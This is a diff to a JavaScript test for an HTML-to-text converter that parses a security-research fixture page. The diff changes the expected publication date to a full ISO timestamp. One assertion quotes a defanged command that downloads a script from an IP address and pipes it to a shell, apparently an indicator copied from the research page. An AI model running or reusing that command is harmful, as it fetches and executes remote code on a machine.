@@ -52,7 +52,7 @@ test('html→text keeps <pre> blocks verbatim and drops nav/footer', () => {
   const r = htmlToText(readFixture('sources/netscaler.html'), 'https://research.vendor-fixture.test/x');
   assert.ok(r.text.includes('/bin/sh -c curl -s hxxp://45[.]61[.]139[.]12/x.sh | bash'));
   assert.ok(!r.text.includes('Home | Blog'));
-  assert.equal(r.publishedAt, '2026-10-20');
+  assert.equal(r.publishedAt, '2026-10-20T09:00:00.000Z'); // full ISO: hour/minute survive to sources.published_at
   assert.equal(r.publisher, 'Vendor Fixture Research');
 });
 
